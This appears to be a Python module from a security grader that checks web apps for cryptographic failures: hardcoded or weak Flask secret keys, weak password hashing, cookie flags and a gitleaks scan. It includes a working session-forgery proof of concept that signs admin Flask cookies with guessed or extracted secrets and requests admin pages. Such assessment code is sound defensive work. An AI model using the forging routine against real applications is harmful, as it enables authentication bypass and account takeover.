"""A04 Cryptographic Failures: hardcoded/weak secrets, password hashing, cookie
flags, the gitleaks secret scan, and the live session-forgery PoC.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List, Optional, Sequence, Tuple

import requests

from ..shared.external_tools import (
    _SKIP_REASON, _gate, _run_json, _skipped, _stub_command, _tool_cfg,
)
from ..shared.http import _body_text, _json_or_none, _looks_like_admin, _snip
from ..shared.sources import Source, _iter_lines, _joined
from .base import Check, _undecidable, result


# ── hardcoded_secret  (static) — *_KEY / secret_key assigned a string literal.
# Handles NAME=, app.secret_key=, config['SECRET_KEY']=, app.config[...]=, NAME:.
_SECRET_LHS = re.compile(
    r"""
    (?P<lhs>
        (?:[A-Za-z_][\w.]*\.)?
        (?:
            (?:SECRET_KEY|secret_key)
          | (?:config\s*\[\s*['"]SECRET_KEY['"]\s*\])
          | (?:\[\s*['"]SECRET_KEY['"]\s*\])
        )
    )
    \s*[:=]\s*
    (?P<rhs>.+)$
    """,
    re.VERBOSE,
)
_ENV_REF = re.compile(
    r"""(os\.)?environ\s*(\[|\.get\s*\()|(os\.)?getenv\s*\(""",
    re.VERBOSE,
)
_STR_LITERAL = re.compile(r"""^\s*[a-zA-Z]?['"]""")


def check_hardcoded_secret(check, sctx, cfg):
    penalty = float(cfg.get("penalty_per_finding", 100))
    allow_env = bool(cfg.get("allow_env_reference", True))

    reasons: List[str] = []
    evidence: List[str] = []
    for path, lineno, line in _iter_lines(sctx.sources):
        m = _SECRET_LHS.search(line)
        if not m:
            continue
        rhs = m.group("rhs").strip()
        if allow_env and _ENV_REF.search(rhs):
            continue
        if not _STR_LITERAL.match(rhs):
            continue
        reasons.append(f"{path}:{lineno} SECRET_KEY 하드코딩")
        evidence.append(f"{path}:{lineno}: {line.strip()}")

    return result(check, cfg, score=100.0 - penalty * len(reasons),
                  passed=not reasons, reasons=reasons, evidence=evidence)


# The literal string value of a hardcoded SECRET_KEY (quotes stripped).
_SECRET_LITERAL = re.compile(r"""^[a-zA-Z]?['"](?P<val>[^'"]*)['"]""")


def extract_hardcoded_secrets(sources: Sequence[Source]) -> List[str]:
    """Literal SECRET_KEY values hardcoded in the source. Fed to the live session-
    forgery PoC (via DynamicContext) so a hardcoded key is DEMONSTRATED forgeable —
    the grader knows the exact value, forges an admin session, and proves takeover."""
    out: List[str] = []
    for _path, _lineno, line in _iter_lines(sources):
        m = _SECRET_LHS.search(line)
        if not m:
            continue
        rhs = m.group("rhs").strip()
        if _ENV_REF.search(rhs):
            continue
        lm = _SECRET_LITERAL.match(rhs)
        if lm and lm.group("val") and lm.group("val") not in out:
            out.append(lm.group("val"))
    return out


# ── weak_default_secret  (static) — os.environ.get("SECRET_KEY", "<literal>")
# fallback, which hardcoded_secret skips because it sees an env reference. Match
# only SESSION-SIGNING key names (must contain SECRET) — NOT arbitrary "KEY"/
# "PASSWORD" env vars like ADMIN_PASSWORD / API_KEY, whose weak default is a
# different (and lesser) issue and must not trip the session-forgery critical.
_WEAK_DEFAULT = re.compile(
    r"""(?:environ\.get|getenv)\s*\(\s*['"][^'"]*SECRET[^'"]*['"]\s*,\s*(?P<def>['"][^'"]*['"])""",
    re.IGNORECASE,
)


def check_weak_default_secret(check, sctx, cfg):
    reasons: List[str] = []
    evidence: List[str] = []
    for path, text in sctx.sources:
        for m in _WEAK_DEFAULT.finditer(text):
            default = m.group("def").strip("'\"")
            if not default:
                continue  # empty fallback => still needs env, acceptable
            lineno = text.count("\n", 0, m.start()) + 1
            reasons.append(f"{path}:{lineno} 환경변수 미설정 시 하드코딩 기본 시크릿으로 폴백")
            evidence.append(f"{path}:{lineno}: {m.group(0)[:120]}")
    if reasons:
        return result(check, cfg, score=cfg.get("score_weak", 0), passed=False,
                      reasons=reasons, evidence=evidence)
    return result(check, cfg, score=cfg.get("score_ok", 100), passed=True)


# ── password_hashing  (static) ─────────────────────────────────────────────
_STRONG_HASH = re.compile(
    r"""bcrypt|argon2|scrypt|pbkdf2|generate_password_hash|check_password_hash|passlib""",
    re.IGNORECASE,
)
_WEAK_HASH = re.compile(r"""\b(md5|sha1)\s*\(""", re.IGNORECASE)
_PW_TOKEN = re.compile(r"""pass|pwd|\bpw\b|password|secret|credential""", re.IGNORECASE)
# Plaintext password comparison against a STORED credential, e.g.
# ``user.password == pw`` or ``row['password'] == pw``. A bare ``password ==
# confirm`` (signup confirmation) is NOT stored-credential access, so it no longer
# false-positives as a plaintext compare.
_STORED_PW = r"""(?:\w+\s*\.\s*(?:password|passwd)\b|\[\s*['"](?:password|passwd)['"]\s*\])"""
_PLAINTEXT_CMP = re.compile(
    rf"""{_STORED_PW}\s*==|==\s*{_STORED_PW}""",
    re.IGNORECASE,
)


def check_password_hashing(check, sctx, cfg):
    score_strong = float(cfg.get("score_strong", 100))
    score_weak = float(cfg.get("score_weak_hash", 30))
    score_plain = float(cfg.get("score_plaintext", 0))
    score_unknown = float(cfg.get("score_unknown", 60))

    strong_ev: List[str] = []
    weak_ev: List[str] = []
    plain_ev: List[str] = []
    for path, lineno, line in _iter_lines(sctx.sources):
        if _STRONG_HASH.search(line):
            strong_ev.append(f"{path}:{lineno}: {line.strip()}")
        wm = _WEAK_HASH.search(line)
        if wm and _PW_TOKEN.search(line):
            weak_ev.append(f"{path}:{lineno}: {line.strip()}")
        if _PLAINTEXT_CMP.search(line):
            plain_ev.append(f"{path}:{lineno}: {line.strip()}")

    # Precedence: plaintext compare worst, then weak hash, then strong.
    if plain_ev:
        return result(check, cfg, score=score_plain, passed=False,
                      reasons=[f"{e.split(':', 2)[0]}:{e.split(':', 2)[1]} 평문 비밀번호 비교"
                               for e in plain_ev],
                      evidence=plain_ev)
    if weak_ev:
        return result(check, cfg, score=score_weak, passed=False,
                      reasons=[f"{e.split(':', 2)[0]}:{e.split(':', 2)[1]} 취약한 해시(md5/sha1) 사용"
                               for e in weak_ev],
                      evidence=weak_ev)
    if strong_ev:
        return result(check, cfg, score=score_strong, passed=True, evidence=strong_ev)
    return result(check, cfg, score=score_unknown, passed=score_unknown >= 60,
                  reasons=["명확한 비밀번호 해싱 로직을 찾지 못함"])


# ── cookie_flags  (static) ─────────────────────────────────────────────────
_COOKIE_FLAGS = {
    "SESSION_COOKIE_HTTPONLY": "HttpOnly",
    "SESSION_COOKIE_SECURE": "Secure",
    "SESSION_COOKIE_SAMESITE": "SameSite",
}
# Flask sets the session cookie HttpOnly by DEFAULT, so an app using Flask sessions
# already has HttpOnly unless it explicitly turns it off — don't penalize it.
_FLASK_SESSION = re.compile(r"""from\s+flask\s+import[^\n]*\bsession\b|\bsession\s*\[|flask\.session""", re.IGNORECASE)
_HTTPONLY_OFF = re.compile(r"""SESSION_COOKIE_HTTPONLY['"\]\s]*[=:]\s*False""", re.IGNORECASE)
# A flag NAME present but set to a disabling value is NOT protection. `Secure=False`
# is the common one (apps disable it to work over plain HTTP) — crediting it just
# because the string appears is a false positive (the flag is off). SameSite=None
# (or False) likewise removes the cross-site restriction. HttpOnly keeps its own
# `_HTTPONLY_OFF` (Flask defaults it on, so only an explicit False disables it).
_SECURE_OFF = re.compile(r"""SESSION_COOKIE_SECURE['"\]\s]*[=:]\s*False""", re.IGNORECASE)
_SAMESITE_OFF = re.compile(r"""SESSION_COOKIE_SAMESITE['"\]\s]*[=:]\s*(?:False|None|['"]None['"])""", re.IGNORECASE)
_FLAG_OFF = {"Secure": _SECURE_OFF, "SameSite": _SAMESITE_OFF}


def check_cookie_flags(check, sctx, cfg):
    baseline = float(cfg.get("baseline", 25))
    per_flag = float(cfg.get("score_per_flag", 25))

    joined = _joined(sctx.sources)
    httponly_off = bool(_HTTPONLY_OFF.search(joined))
    uses_flask_session = bool(_FLASK_SESSION.search(joined))
    present = []
    evidence: List[str] = []
    for flag, label in _COOKIE_FLAGS.items():
        explicit = bool(re.search(re.escape(flag), joined))
        if label == "HttpOnly":
            # Present if explicitly set OR Flask-session default — unless disabled.
            if not httponly_off and (explicit or uses_flask_session):
                present.append(label)
                evidence.append(flag if explicit else "Flask 세션 기본값(HttpOnly=True)")
        elif explicit and not (label in _FLAG_OFF and _FLAG_OFF[label].search(joined)):
            # The name appears AND is not set to a disabling value (False/None).
            present.append(label)
            evidence.append(flag)

    missing = [lbl for lbl in _COOKIE_FLAGS.values() if lbl not in present]
    reasons = [f"세션 쿠키 {m} 플래그 미설정" for m in missing]
    return result(check, cfg, score=baseline + per_flag * len(present),
                  passed=not missing, reasons=reasons, evidence=evidence)


# ── gitleaks_secrets  (static) — hardcoded-secret corroboration (report-only).
def check_gitleaks_secrets(check, sctx, cfg):
    config = sctx.config
    tcfg = _tool_cfg(config, "gitleaks")
    bin_path, skip = _gate(config, "gitleaks")
    if bin_path is None:
        return _skipped(check.id, check.label, "gitleaks", skip or _SKIP_REASON)

    cmd = _stub_command(bin_path) + [
        "detect", "--no-git", "--report-format", "json",
        "--report-path", "/dev/stdout", "--source", sctx.app_dir,
    ]
    data = _run_json(cmd, float(tcfg.get("timeout", 60)))
    if data is None:
        data = []  # ran but nothing parseable => treat as clean

    reasons, evidence = _parse_gitleaks(data)
    return result(check, cfg, score=0.0 if reasons else 100.0, passed=not reasons,
                  reasons=reasons, evidence=evidence, tool="gitleaks")


def _parse_gitleaks(data: object) -> Tuple[List[str], List[str]]:
    reasons: List[str] = []
    evidence: List[str] = []
    findings = data if isinstance(data, list) else data.get("findings", []) if isinstance(data, dict) else []
    for f in findings or []:
        if not isinstance(f, dict):
            continue
        rule = f.get("RuleID") or f.get("Description") or "secret"
        file_ = f.get("File", "")
        line = f.get("StartLine", "")
        loc = f"{file_}:{line}" if file_ else ""
        reasons.append(f"{loc} {rule} 시크릿 탐지".strip())
        secret = f.get("Secret", "")
        evidence.append(f"{loc}: {rule} {secret}".strip())
    return reasons, evidence


# ── session_forgery  (dynamic) — LIVE PoC for a known/weak SECRET_KEY.
# Report-only weight (0 in config): it proves the weak_default_secret critical by
# forging a Flask session cookie signed with a guessed default secret and reaching
# /admin as the first (admin) user. Needs flask importable on the grader host.
def dynamic_session_forgery(check, ctx, cfg):
    weak = list(ctx.config.get("probes.weak_secrets", []) or [])
    source = [s for s in (getattr(ctx, "source_secrets", []) or []) if s]
    secrets = weak + [s for s in source if s not in weak]
    if not secrets:
        return _undecidable(check, cfg,
                            "시도할 시크릿 없음(약한 시크릿 목록·소스 추출 모두 비어있음)")
    fid = int(cfg.get("forge_user_id", 1))
    paths = list(cfg.get("admin_paths", ["/admin", "/admin/users"]))
    # Forge several common session-key shapes so it works across apps.
    payload = {"user_id": fid, "uid": fid, "id": fid, "logged_in": True,
               "is_admin": True, "admin": True, "role": "admin"}

    if _forge_flask_cookie(secrets[0], payload) is None:
        return _undecidable(check, cfg,
                            "flask 미설치로 세션 위조 검증 불가(정적 weak_default_secret로 감점 유지)")

    for path in paths:
        # Only attribute to forgery if the path is NOT already open without a cookie.
        base = ctx.get(requests.Session(), path)
        if base is not None and base.status_code == 200 and _looks_like_admin(
            _body_text(base), _json_or_none(base)
        ):
            # Access control (not forgery) is the issue here; access_control_admin owns it.
            continue
        for secret in secrets:
            forged = _forge_flask_cookie(secret, payload)
            if forged is None:
                continue
            name, value = forged
            sess = requests.Session()
            sess.cookies.set(name, value)
            r = ctx.get(sess, path)
            if r is not None and r.status_code == 200 and _looks_like_admin(
                _body_text(r), _json_or_none(r)
            ):
                origin = "소스에 하드코딩된" if secret in source else "알려진 약한"
                return result(check, cfg, score=cfg.get("score_forged", 0), passed=False,
                              reasons=[f"{origin} 시크릿 {secret!r}로 세션 쿠키를 위조해 user_id={fid}(admin) "
                                       f"권한으로 {path} 접근 성공 → 인증 우회·계정 탈취 가능"],
                              evidence=[_snip(f"forged {name}={value}"),
                                        _snip(f"{path} -> 200 (admin 콘텐츠 렌더)")],
                              tool="flask-session-forge")
    return result(check, cfg, score=cfg.get("score_safe", 100), passed=True,
                  evidence=[_snip(f"{len(secrets)}종 기본 시크릿으로 위조 시도 → 관리자 접근 실패(서명 검증 정상)")],
                  tool="flask-session-forge")


def _forge_flask_cookie(secret: str, payload: Dict[str, Any]) -> Optional[Tuple[str, str]]:
    """Return (cookie_name, signed_value) for a Flask session forged with ``secret``,
    or None if Flask isn't importable / signing fails."""
    try:
        from flask import Flask
        from flask.sessions import SecureCookieSessionInterface
    except Exception:
        return None
    try:
        app = Flask(__name__)
        app.secret_key = secret
        serializer = SecureCookieSessionInterface().get_signing_serializer(app)
        if serializer is None:
            return None
        name = app.config.get("SESSION_COOKIE_NAME", "session")
        return name, serializer.dumps(dict(payload))
    except Exception:
        return None


CHECKS = [
    Check("hardcoded_secret", "하드코딩 시크릿", "static", check_hardcoded_secret),
    Check("weak_default_secret", "약한 기본 시크릿", "static", check_weak_default_secret),
    Check("password_hashing", "비밀번호 해싱", "static", check_password_hashing),
    Check("cookie_flags", "쿠키 보안 플래그", "static", check_cookie_flags),
    Check("gitleaks_secrets", "시크릿 스캔(gitleaks)", "static", check_gitleaks_secrets,
          cfg_path="tools", report_only=True),
    Check("session_forgery", "세션 위조 검증(약한 SECRET_KEY)", "dynamic",
          dynamic_session_forgery),
]
